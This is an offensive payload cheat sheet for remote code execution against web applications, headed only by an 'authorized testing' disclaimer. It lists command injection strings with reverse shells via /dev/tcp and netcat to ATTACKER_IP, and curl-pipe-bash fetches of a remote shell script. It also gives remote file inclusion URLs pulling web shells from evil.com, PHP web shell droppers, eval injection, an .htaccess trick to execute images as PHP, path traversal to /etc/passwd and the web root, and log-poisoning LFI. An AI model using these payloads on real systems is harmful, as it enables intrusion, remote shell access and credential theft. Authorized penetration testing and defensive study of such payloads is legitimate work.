🛡 RCE Exploitation Vectors
_By CybrX1337 – BURPSUITE_

⚠ **Educational / Authorized Testing Only**

---

## 1. Command Injection Payloads

; id
&& whoami
| uname -a
|| ls -la
`whoami`
$(whoami)
; /bin/bash -c "echo hacked > /tmp/hacked.txt"
; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
&& /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
| nc -e /bin/sh ATTACKER_IP 4444
; nc -e /bin/sh ATTACKER_IP 4444
&& nc -e /bin/sh ATTACKER_IP 4444
; ping -c 5 ATTACKER_IP
| ping -c 5 ATTACKER_IP
&& ping -c 5 ATTACKER_IP
; curl http://ATTACKER_IP/shell.sh | bash
| curl http://ATTACKER_IP/shell.sh | bash
; echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
| cat /etc/passwd
&& cat /etc/passwd

Replace ATTACKER_IP with your own IP for reverse shell commands.

---

## 2. Remote File Inclusion (RFI) Payloads

?page=http://evil.com/shell.txt
?page=http://evil.com/shell.txt?cmd=id
?page=http://evil.com/shell.txt%00
?page=php://filter/convert.base64-encode/resource=http://evil.com/shell.txt
?page=http://evil.com/shell.txt%23
?page=http://evil.com/shell.txt%0a
?page=http://evil.com/shell.txt%0d%0a
?page=http://evil.com/shell.txt%09
?page=\\evil.com\shell.txt
?page=//evil.com/shell.txt
?page=./http://evil.com/shell.txt
?page=php://input
?page=php://input?cmd=id
?page=php://filter/read=convert.base64-encode/resource=http://evil.com/shell.txt
?page=expect://id
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
?page=ftp://evil.com/shell.txt
?page=http://evil.com/shell.txt?cmd=ls+-la
?page=http://evil.com/shell.txt?cmd=uname+-a
?page=http://evil.com/shell.txt?cmd=whoami
?page=http://evil.com/shell.txt?cmd=nc+-e+/bin/bash+attacker_ip+port
?page=http://evil.com/shell.txt%00.jpg

---

## 3. Unsafe eval() Injection Payloads

?code=system('id')
?code=exec('whoami')
?code=passthru('ls -la')
?code=assert($_GET[cmd])

---

## 4. Post-upload Execution Triggers

Using .htaccess to treat .jpg as PHP:

AddType application/x-httpd-php .jpg

Overwrite existing script by path traversal:

../../../../var/www/html/shell.php

---

## 5. Path Traversal Payloads (for LFI, File Overwrite, or Upload Bypass)

../../../../../../etc/passwd
../../../var/www/html/shell.php
../../../../../../tmp/shell.php
..%2f..%2f..%2f..%2fetc/passwd
..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
....//....//....//....//etc/passwd
../../../../../../var/log/apache2/access.log
../../../../../../var/log/nginx/access.log
../../../../../../proc/self/environ
../../../../../../dev/shm/shell.php
../../../../../../tmp/shell.php
../uploads/../../shell.php

---

## 6. Local File Inclusion (LFI) + Log Poisoning Payload Example

    Inject into access log or user agent:

<?php system($_GET['cmd']); ?>

    Access via LFI:

?page=../../../../var/log/apache2/access.log&cmd=id

---

## 7. File Upload Path Traversal Example

Upload filename:

../../../../var/www/html/shell.php

    If the upload function is vulnerable to path traversal, attacker can overwrite web root files.

---

## 8. URL Encoded Variants

..%2f..%2f..%2f..%2fetc/passwd
..%5c..%5c..%5c..%5cwindows\system32\drivers\etc\hosts
